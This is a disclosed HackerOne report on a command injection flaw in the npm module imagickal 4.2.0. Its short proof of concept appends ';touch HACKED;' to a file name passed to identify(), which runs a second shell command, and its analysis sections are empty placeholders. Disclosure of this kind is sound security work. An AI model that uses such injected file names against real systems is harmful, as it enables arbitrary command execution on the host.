---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '973245'
original_report_id: '973245'
title: '[imagickal] Remote Code Execution'
weakness: Code Injection
team_handle: nodejs-ecosystem
created_at: '2020-09-02T15:44:19.113Z'
disclosed_at: '2021-01-14T08:39:54.544Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 0
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- code-injection
---

# [imagickal] Remote Code Execution

## Metadata

- HackerOne Report ID: 973245
- Weakness: Code Injection
- Program: nodejs-ecosystem
- Disclosed At: 2021-01-14T08:39:54.544Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report `RCE` in `imagickal`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** imagickal
**version:** 4.2.0
**npm page:** `https://www.npmjs.com/package/imagickal`

## Module Description

node wrapper for ImageMagick commands

## Module Stats

[42] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection while processing a photo

## Steps To Reproduce:

- Run `npm i imagickal`
- Create and run the following POC index.js:

```javascript
var im = require('imagickal');

im.identify('image.jpg;touch HACKED;').then(function (data) {
  console.log(data);
});
```

- The exploit worked and created the file - `HACKED`

{F973742}

## Patch

Check input before command

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `imagickal` module via insecure command

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
